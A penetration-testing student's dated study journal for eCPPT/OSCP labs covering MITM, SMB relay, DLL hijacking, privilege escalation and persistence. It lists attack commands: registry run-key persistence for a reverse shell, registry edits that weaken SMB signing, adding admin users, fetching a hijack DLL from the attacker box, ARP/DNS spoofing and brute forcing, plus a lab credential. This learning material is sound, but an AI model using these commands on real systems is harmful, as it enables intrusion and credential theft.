
Networking Section Completed 

## 1/5/2022

## Blind Penetration Test

Microsoft IIS default webroot folder is inetpub

When using a webshell you might not be able to use cd but you might be able to still use dir or exec programs.

davtest and cadaver can both be used to test web apps for file uploads.

One reliable way to migrate from a webshell is to upload a msfvenom payload and then execute it using the webshell. Finding where the exe is located can be tricky.

I understand that you can steal tokens and use them to impersonate services, I just dont know how you would do it manually. I've seen powershell scripts but have not tested them. Also seen JuicyPotato, and other tools 


## 1/4/2022

Started studying the webapp pentesting slides. 

## 1/3/2022

## Labs

### Privilege Escalation Lab

**How do we know which UACME bypass to use?**

Answer: INE's section on UACME isn't fleshed out enough. You have to know how each bypass works, investigate the environment to pick the correct bypass. I wonder if there's a tool to automate this that isn't a metasploit module.

Observation: When using Akagi, make sure to use the entire path of the payload. It will not work otherwise even if ran from the same directory.

**Why did using windows/x64/meterpreter/reverse_tcp fail but the regular meterpreter did not?**
Answer: I noticed some oddities. 1. multiple sessions using the same local ports. I would assume once a port is in use, it can no longer be used. For windows/meterpreter/reverse_tcp this didn't appear to be a problem. However for windows/x64 this was a problem. Changing Lport to 4445 instead of 4444 seemed to fix the issue. I'm not even sure what question to ask about this.

Also you cant spawn x64 payloads from x86 Akagi


### Post-Exploitation Lab

## Videos

### Session Gopher

Session Gopher steals locally stored creds. RDP, PUTTY, WinSCP

Powershell Download Cradle mentioned again.




### Meterpreter SSL Cert Impersonation & Detection Evasion

Exploits leave traces that make it easy for IDS to pinpoint and block payloads. One example is SSL Certificates. We can use metasploit
`gather/impersonate_ssl`

They mentioned something called a download "cradle". First time seeing this but it seems like a command line file to use internet explorer to download a file.


### Mapping the Network

Check interfaces, arp tables, ip routes

`ipconfig /dnsdisplay`

Also covered using routes to attack victims outside of initial scan scope




### DNS Tunneling

1. Get a domain from godaddy
2. Use Iodine to set up DNS server listener
3. Have server configured BEFORE engagement. 
4. `cat /etc/resolve.conf` to find dns server
5. ping dns server 
6. Use Iodine Client to create tunnel
7. forward traffic via SSH socks proxy to protect data in transit.


## 1/2/2022
 
 Found out that Microsoft is depreciated wmic. I should look for alternatives. Seems alot of cyber tools come in, have their moment of glory and then leave.


## 1/1/2022

## Anonymity / Social Engineering: 

You can port forward via SSH to send plaintext traffic like telnet using the SSH protocol to secure it.

There are four ways to Social Engineer. Pretexting, Baiting, Phishing, and Physical. The number one idea mentioned was to make the situation as familiar as possible while also using emotions. SET was mentioned but I was already aware of the framework. Kevin Mitnic's name has been mentioned anywhere Social Engineering has been mentioned. I should look into this guy.


## 12/29/2022

### DLL Hijacking Lab

One thing I notice is that you need admin privs to run procmon. How would you do this exploit without admin privileges? Maybe if you own the vulnerable application on a personal computer, you could try to reproduce it there.

May seem trivial but I learned that you can't just copy paste .dll files using a text editor.... I created the payload dll on the Kali attacker box but, I wasn't able to set up a reverse tcp shell or ftp connection to the Windows box. So I tried that as a last resort. The only way to transfer the files was to host a webserver and on the designated host access the webserver.

Also trivial, but I **re-learned** painfully that you can access subdirectories even if the parent directory is blocked from you...
During my enumeration I ignored Users/Admin/Desktop/DVTA..* because I could not even look inside Users/Admin/ from the file explorer. This set me back about 45 minutes of attempting to find Modification privileges in 20 system folders. Next time just use `icacls` on every directory, don't use the file explorer.

Internet Explorer was hardened, even adding my attacker box to the trusted sites, and trusted intranet  in the IE settings did not let me bypass the content blockers. Had to use 

(Powershell):
`iwr -UseBasicParsing -Uri http://IP/Dwrite.dll -OutFile C:\Users\Administrator\Desktop\dvta\bin\Release\Dwrite.dll`

Not sure what I would have done if that did not work as there were no other webbrowsers or connections from the attacker box to the windows box. 
## 12/28/2022

### DLL Hijacking

A.k.a DLL Preloading or Insecure Library Loading

Can I create some sort of mnemonic device to remember this? 

![image](https://user-images.githubusercontent.com/1501624/209873963-f9e50eb6-d7b0-417f-aa0a-4436a2c55203.png)

Also Linux isn't covered in this, but linux shared object hijacking is a thing as well. Something to pay attention to.


msg

### Manually setting up persistence

reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "<Path to reverse shell>" -v <nameOfRegistryValue>

## 12/27/2022

## Post Exploitation: Persistence

Alot of content here is just commands, I'll have to use ANKI to better try to remember.

We can use msfvenom to create payloads. We can use BDF(Linux) and Shellter (Windows + Wine) to inject the payloads

3 ways to maintain persistence:  1) Password Hashes (crack or pass) for services, 2) Users for services, 3)Backdoors


`exploit/windows/smb/psexec` can be used to pass the hash. Requires admin privs to run. May not work on local admins.


Bypass local admin status_access_denied message by adding two registry entries


`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters` : Add DWORD RequireSecuritySignature and set to 0

`HKEY_LOCAL_MACHINE\System\Microsoft\Windows\CurrentVersion\Policies\System`: Add DWORD LocalAccountTokenFilterPolicy and set to 1


You can set Registry values via powershell session using `Set-ItemProperty -Path`

You can set Registry values via CLI using `reg add`

When using mimikatz, you get the most features using a 64bit process (to host meterpreter or other shell). You can migrate to another process by using...

`ps -A x86_64 -s` : list all 64 bit processes, look for one with the same privs as you.


`migrate <pid>`

Windows Credentials Editor is another potential tool to work with credentials, logon sessions, Kerberos etc..

You can check which services are enabled by using `net start`

meterpreter scripts

Enumerate services:


`run service_manager -l`

`run post/windows/gather/enum_services`

Enable RDP

` run getgui -e`

Windows add user to "Remote Desktop Users" group

`net localgroup "Remote Desktop Users" <username> /add`

Windowows: enumerate groups

`net` [[Built-in Groups]](https://ss64.com/nt/syntax-security_groups.html)

Windows enumerate users in group
`net localgroup "Administrators"`

Windows add user to Administrators

`net localgroup "Administrators" <user> /add`

Summary: Escalate privileges, Harvest Creds, Create New users, add them to the correct groups (like Remote Desktop Users), with the correct permissions (System), open firewall ports if needed. Start the services, and add the users to the services.


## DNS and SMB Relay Attack

I started with an initial nmap scan of `nmap -sS -sC -sV -p- 172.16.5.*`. This came back showing that all available hosts had smbv2 and had disabled signing. Smb relays will be possible on this network. I also searched for port 53 on any hosts incase I have to position myself between the targets and a dns server. There is no dns service on the network.

I was watching network traffic using wireshark and noticed that 172.x.x.5 was sending arp requests for 172.x.x.30. I also enabled ip_forwarding on my machine.

This lead me to arpspoof using `arpspoof -i eth1 -r 172.x.x.5 -t 172.x.x.30` and vice versa.

x.x.x.30 was down so I stopped attempting to arpspoof that target. I noticed that x.x.x.5 was sending DNS requests to fileserver.foo.

I began to read about the dnsspoof tool and it said that you must create a hosts file. 

Thus I created  a host file that contained 172.x.x.ME wildcard.foo

[[1]](https://null-byte.wonderhowto.com/how-to/hack-like-pro-spoof-dns-lan-redirect-traffic-your-fake-website-0151620/) [[2]](https://tournasdimitrios1.wordpress.com/2011/03/03/dns-spoofing-with-dnsspoof-on-linux/) Then I ran `dnsspoof -f hosts -i eth1` and began responding the dns requests. I also tried using responder as I noticed that it had a dns option but it did not seem to pick up on the traffic.

After responding to the requests using dnsspoof I noticed that the victim was attempting to connect using ports 445 and 139. This led me to start capturing smb traffic.

I used metasploits `auxiliary/server/capture/smb` and I captured a NTLM hash from user aline. Observations: 1. Lm was disabled 2. The NTLM hash was v2 3.The challenge did not contain 2f85252cc731bb25 so I knew that the password was 8 characters or longer. 

This would make it not feasible to attempt to crack the hash, so I saved the hash and moved on to attempting a relay attack.

I used exploit/windows/smb/smb_relay and sucuessfully obtained a root on the target.

The lab crashed. I looked at the solution to see if I missed anything, and I finished all of the tasks sucessfully before the lab crashed.


POST LAB Questions: The challenges did not contain the string that implies that a string is less than 7 characters (2f85252cc731bb25). However after extracting the hashes in an elevated meterpreter session, and cracking them, I noticied that they are empty. aad3b435b51404eeaad3b435b51404ee (LM) and 31d6cfe0d16ae931b73c59d7e0c089c0 (NTLM) [(empty hashes)](https://security.stackexchange.com/questions/169923/john-the-ripper-not-displaying-cracked-password) correspond to an empty password. If the hashes were empty why did they not show 2f85252cc731bb25 in the challenge? empty is less than 7 characters.

## 12/25/2022

## Client Exploit Lab

 Lab crashed twice, and after a few hours of attempting to solve it, I used the solution which also didn't work. Going to skip this one.
 
 I did get a nifty script to send an email though using smtplib [script](https://github.com/Szwochm/OSCP-Prep/blob/main/sendSmtp)

## 12/20/2022

## Nessus Lab Cont.

Figured out an initial foot hold. One of the targets had HeartBleed exploit. I tried this exploit initially yesterday but did not realize that you had to set the verbose mode to TRUE to be able to see the memory leak. In the memory leak I found credentials for SSH. I must learn to how to thoroughly investigate potential exploits. This stops me from constantly bouncing back and fourth between potential attack vectors so I can more methodically move through my enumeration.

Also using Nessus caused MySql on one of the boxes to block all connections.

I was able to successfully finish the lab and find all of the vulnerabilities. I did not create a report as I have already spent two days on this lab.

Useful metasploit stuff:

You can reference nessus scan results **WITHOUT** importing the scan by using 

`nessus_scan_list`

`nessus_report_hosts 8`

`nessus_report_vulns 8`

Obviously you can also just use db_import, hosts, services, vulns etc...

## 12/19/2022
## Nessus Lab

[Working with Nessus](https://www.offensive-security.com/metasploit-unleashed/working-with-nessus/)

This was a tough lab. I spent an hour and a half on it with no progress. Will try again tomorrow.


## More Windows Security
Unquoted Service Paths: Windows services have a setting that describes the path to a desired executable. If that path is unquoted, we can abuse this and place.

[Example Ref](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)

![image](https://user-images.githubusercontent.com/1501624/208587720-fe570452-7bff-4a07-b792-7715e0c58489.png)



Windows tokens come in two forms: Impersonation (non-interactive) and Delegation (interactive / remote login). When a user with delegation tokens logs off, those tokens become Impersonation tokens with much of the same permissions as the Delegation tokens. They tokens persist until reboot. We can steal these tokens using Incognito.

## VA and Exploiting Lab: 

[[ Lab Report: Findings]](https://github.com/Szwochm/OSCP-Prep/blob/main/eCCPT%20Networking/Va-Exploiting-Lab/report.html)

Note:This is my first time attempting to create a lab report. I'm not happy with how it looks, but its a start.





## 12/16/2022
## Windows Security

LM and NTLMv1 is easy to crack. They are stored in SAM (host) / NTDS (domain controller), and can be dumped using tools like mimicatz.

NTLMv2 is much harder to crack and it uses blobs, and HMAC-MD5 hashing to create its hashes. It also incorperates the time into the challenge. Its not impossible, but unless the password is very easy, cracking it will be hard. The best way to exploit NTLM v2 is by simply passing the hash using a relay attack.

For Windows authentication, if the challenge ends with the byte sequence of 2f85252cc731bb25, this indicates that the password is 7 chars or less.

[[1]](https://hunter2.gitbook.io/darthsidious/getting-started/intro-to-windows-hashes) [[2]](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)
### Windows LM

Note: Windows LM is depreciated but may be used in older systems from compatibility. Some systems will send both NT and LM hash to challenge responses.

Take password, convert to uppercase. Pad with 0s until 14 bytes. Split in half. Add 1 parity byte to both. Encrypt using DES protocol on each 8 Byte segment using key phrase KGS!@#$%

### Windows NTLM V1

Take the password, convert to unicode. Take the 16 bytes and pad with 5 null bytes until you get 21 bytes. Split into 3 segments. Add 1 parity byte to each segment. 




## 12/14/2022

Learning about Windows LM authentication. This uses DES. Going to dive into DES as I have seen it mentioned many times (Triple Des isn't banned until 2023) but I still only vaguely know about it.

DES is a Block Cipher which means that it has Key Gen, Encryption and Decryption functions.
[Block Ciphers](https://www.youtube.com/watch?v=oVCCXZfpu-w)

![image](https://user-images.githubusercontent.com/1501624/207729116-1c7ad3fd-bed8-4dd5-b184-d8a9684b262a.png)

It is a symmetric algorithm (Use same key to encrypt and decrypt)

Block Ciphers Encryption **should be** injective (CS 301 throwback). Every X maps to a unique Y (basically no collisions)
![image](https://user-images.githubusercontent.com/1501624/207730097-f7bba9f2-f42b-4e22-8485-47a83f89801a.png)


Block Ciphers Encryption **should be** surjective. Every Y has an X.
![image](https://user-images.githubusercontent.com/1501624/207730335-9e3b1842-b4ae-4d26-9e8b-87b14821b71f.png)


**Question:** Is there a way to realistically prove Bijection without just trying every possible combination?

'Both types of hashes generate a 128-bit stored value. Most password crackers today crack the LM hash first, then crack the NT hash by simply trying all upper and lower case combinations of the case-insensitive password cracked by the LM hash. '





## 12/13/2022

`iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o eth1 -j MASQUERADE`

Ip tables is the command to interface with Linux Firewall. It allows you to configure packet filter rules.

-o eth1: assigns eth1 as outbound interface

-t nat: This table is consulted for a new connection. Using Post Routing it alters packets on the way out.

IP masquerading is a process where one computer acts as an IP gateway for a network. All computers on the network send their IP packets through the gateway, which replaces the source IP address with its own address and then forwards it to the internet.

## 12/6/2022

## ICMP Redirect attack Lab

I'm given the hints that I have to use Scapy to perform an ICMP Redirect attack..

[[1]](https://www.agwa.name/blog/post/icmp_redirect_attacks_in_the_wild) Victim has to contact target within 10 minutes of getting the redirect for it to stick. You can achieve this by doing...

1) Send a new redirect every ten minutes, or right before victim contacts target
2) Following up your redirect request with a spoofed (of the target) TCP SYN packet, they will respond with Syn-Ack

*"Unfortunately, the most intuitive and widely-documented way of disabling ICMP redirects on Linux (by writing 0 to /proc/sys/net/ipv4/conf/all/accept_redirects) doesn't always work!"*. Proc is also the way to enable packet forwarding. Seems like anytime I need to do some sort of network configuration on a linux device /proc/sys/net/ipv4 is a good place to start.

*"This arcane logic means that for a non-router (i.e. most servers), not only must **/proc/sys/net/ipv4/conf/all/accept_redirects** be 0, but so must **/proc/sys/net/ipv4/conf/interface/accept_redirects***"

This reference had some interesting points but I still do not understand ICMP redirection attacks. Only that I can forge a redirect request, and force it to stick in the cache.

Questions I need answered:

**How can I check if a device is vulnerable?** I know that the /proc/.../accept_redirections settings dictate whether it is possible, but how can I scan this from the outside?

**What exactly happens to the traffic flow on a redirect request? Why does this cause DOS in the reference above? I thought MITM attacks (usually) just allow for traffic to be sniffed / manipulated in transit.**

Answer: It just tells a host that a more optimized route is a available. The host uses the new route (which could be an attacker)

**What are some data sources?**

Answer Haven't seen anything on MITRE for ICMP attacks specifically. Route caches are stored in RAM (So no files to analyze) Network analysis with an IDS may be the only way to prevent this attacks other than configuring systems to ignore ICMP Redirect requests.

**How can I use Scapy to create this attack?**

Answer:[Scapy usage example](https://initone.dz/icmp-redirect-attack-explained/)

[Scapy script](https://github.com/Szwochm/OSCP-Prep/blob/main/eCCPT%20Networking/icmpredirect-scapy.py)




## Poisoning and Exploit with Responder Lab cont...

MinGW is a complete runtime environment to support Windows Binaries.

-municode causes unicode preprocessor macro to be predefined. Choose Unicode capable runtime code.

regsv32 

I need to look into selecting payloads... You can do everything right but just using a slightly different payload can change the succuess of an attack. Lab crashed again for the 3rd time, going to move on next content. Will circle back on OSCP labs

## Starting Exploitation Subsection

## Low Hanging Fruits

We can use ncrack, medusa, or hydra to brute force passwords. Medusa and Hydra support more protocols, but ncrack is better and supports rdp

ncrack can be used with nmap

Patator usage guide

Show Available Modules

`patator`

Show help for ssh 

`patator ssh_login --help`

Iterate through in form

    for i in hosts

     for j in logins
  
        for j in passwords
     
`host=FILE0 user=FILE1 password=FILE2 0=hosts.txt 1=logins.txt 2=pwd.txt`

Ignore results that contain a specific login failure message

'patator ... -x ignore:mesg='Login failure message'`

Example 1

patator ssh_login host=x.x.x.x user=FILE0 password=FILE1 0=users.txt 1=password.txt



## 11/12/2022
## Poisoning and Exploit with Responder Lab

I don't know how to use this tool efficiently, I will have to invest more time into it next time I study

!!!MultiRelay uses Runas.exe to run commands as user, and Svc.exe to create a service for the command. If you try to use x86 on x64 or vice versa you will have problems...!!!

Create x86 binaries like this

`ls /usr/share/responder/tools/MultiRelay/bin`

`rm /usr/share/responder/tools/MultiRelay/bin/Runas.exe  `

`rm /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe`

`ls /usr/share/responder/tools/MultiRelay/bin`



`i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Runas.c -o /usr/share/responder/tools/MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv`

`i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Syssvc.c -o /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe -municode`

## Cain & Abel Lab

## 11/11/2022

Cain & Abel did **alot** of extra stuff such as installing a shell, I wish I was around for it in its glory days

## The spoofing notes will be short since OSCP doesn't allow that, and half of these tools are outdated anyways

## Ettercap

Replaced by Bettercap

## Cain&Abel

Outdated, use Bettercap, hashcat, airsnort, JTR, etc...

## Macof

Spam switch to fill up cam table, and sniff traffic on those ports

enable ip forwarding

`echo 1 > /proc/sys/net/ipv4/ip_forward`

## Arpspoof

Remember that you have to launch arpspoof twice... 1st time <target 1 spoof> <target 2>... 2nd time <target 2 spoof> <target 1>
Intercept traffic using a 3rd party tool like wireshark

Also needs ip forwarding as Macof ^

## Better Cap

Sniff traffic

use `--no-spoofing option` to find targets

disable NBNS name resolution using `--no-target-nbns` flag

`-T` Arp Spoof

Manually specific gateway using `-G`

`-x` To sniff plaintext data such as FTP and HTTP Post

Example: `bettercap -I <interface> -T <target> -X -P "HTTPAUTH,URL,FTP,POST"`

## Poisoning and Sniffing Lab notes

After you sniff some smb creds, here is how you mount an smb location...

`mkdir /tmp/finance`

`mount -t cifs -o user=almir,password=Corinthians2012,rw,vers=1.0 //172.16.5.10/finance /tmp/finance`

`ls -l /tmp/finance/`


## Intercepting SSL Traffic

To configure ettercap...

in /etc/ettercap/etter.conf

change `ec_uid` and `ec_gid` to 0

uncomment `redir_command_on "iptables..."` and `redir_command_off "iptables..."`

# SSL Strip (Outdated succeeded by sslstrip+)

MITMs between victim and server, uses http connection for victim, https for server

Manipulates HTTP headers to obtain cookies and elimnate cache pages being requested

Must be used in conjunction with another arp spoofing tool

-f to subsitute favicon, -w to write to file, -l to designate port


Ettercap set up port redirection

`iptable -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080`

**Bettercap implements SSLstrip**

--proxy--https

SSLstrip is defeated by HSTS Policy, which prevents HTTPs to Http downgrade! (Only if they connected prior, you can still attack them on their first connection!)

Although this is defeated by [Preload Lists](https://caniuse.com/stricttransportsecurity). Preload lists can be defeated by subdomains, or by a domain that is sold and rebought by a new owner.

[Vulnerable browser guide](https://caniuse.com/stricttransportsecurity)

## 11/8/2022

## MIMIKATZ

Ine hasn't actually mentioned this tool yet but I see it mentioned while looking up other things I think it would be cool to demo on how to craft an instance that sneaks past AV and maybe extract some creds from a browser etc...

## TCP DUMP
Windows actually has a built-in packet sniffer called pktmon...

https://jvns.ca/tcpdump-zine.pdf

Pipe tcpdump output into wireshark

`ssh some.remote.hosttcpdump - pni any -w - - s0 - U port 8888 | wireshark -k- i-`

tcpdump on loopback interface

`tcpdump -i lo`

Write TCPdump to pcap, only capture 1000 packets. (-c for count)

`tcpdump host 8.8.8.8 -c 1000 -w filename.pcap`

Show HTTP (not HTTPS) requests (-A for Ascii)

`tcpdump -A `

TCP Dump do not resolve hostnames

`tcpdump -n`

TCP Dump ethernet information (Macs and stuff)

`tcpdump -e`

TCP Dump only get packets that are to or from your computer 

`tcpdump -p`

## 11/7/2022
## MITM

### ARP Poisoning
https://attack.mitre.org/techniques/T1557/002/

netdiscover can be useful to find hosts using arp

Dsniff / ArpSpoof
### DHCP
https://attack.mitre.org/techniques/T1557/003/

INE Mentioned DHCP MITM attacks, but did not give tools on how to achieve this. Will have to research further. I did see a DHCP option in the Responder tool...
- DHCP Discovery is on Port 67
- Until IP is assigned, host uses source address of 0.0.0.0
- DHCP Servers all sends offers, client picks the best one
- **Attackers abuse LEASE time to beat out legit DHCP servers**
- DHCP responds with DHCP ACK to Dest IP 255.255.255.255

### Public Key Exchange
- No tools given, research further
- Tangent... MD5 is 32 **hex** characters, Sha-1 is 40 chars, Sha-256 is 64 characters

### LLMNR and NBT-NS 
https://attack.mitre.org/techniques/T1557/001/
- Capture NTLMV1/2 or LM Hashes
- Responder / Multi Relay
<details> 
  <summary>Q:What needs to be enabled/disabled for these attacks to work? </summary>
   A: Smb-Signing must be disabled 
</details>

#### Data Sources:
- Ports UDP 5355, 137 if LLMNR or NetBios are disabled
- Traffic from unknown devices, local traffic metadata
- Service created (Events 4697, 7045)
- Changes to Registry key HKLM\Software\Policies\Microsoft\Windows NT\DNSClient for enable multicast.

## Responder / MultiRelay
- The Responder, and MultiRelay tools offer many MITM services, not just LLMNR and NBT-NS. DNS, WPAD, and SMB looked interesting...
- Disable SMB and HTTP servers on responder to prevent Multi Relay conflicts [(1)](https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/)
- Specify targets for responder using RespondTo = <IP/Range> <IP/Range>... in responder.conf
- Specify users for MultiRelay using  python3 MultiRelay.py -t 10.0.2.4 -u Administrator Name2 OR ALL
- Responder, "tricks" the victim with responses. MultiRelay forwards the hashes to achieve passthehash attacks

**- INE didn't mention this, but searches returned that this is one way to take over a domain. AD Domain Takeovers are part of the new OSCP. Keep an eye on this**


## 11/2/2022

## Arp

Windows 10 show arp cache 
`arp -a`

TTL for ARP on switches is several minutes while on Windows its in the seconds
https://learn.microsoft.com/en-US/troubleshoot/windows-server/networking/address-resolution-protocol-arp-caching-behavior

In Windows...
`netsh interface ipv4 show interfaces -- find ID for given interface`

`netsh interface ipv4 show interface <idx>` find all info, such as TTL (Called Reachable Time, once it expires, ARP entry becomes "Stale" and host must make another request

Arp Requests can be broadcast on 00:00:00:00:00:00, FF:FF:FF:FF:FF:FF (Data Link) or 255.255.255.255 (IP)

There are other protocols in Arp family, such as RARP, INARP, etc... Inarp looked particularly interesting for further research

Apparently you can change ARP TTL using Registry Value
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters
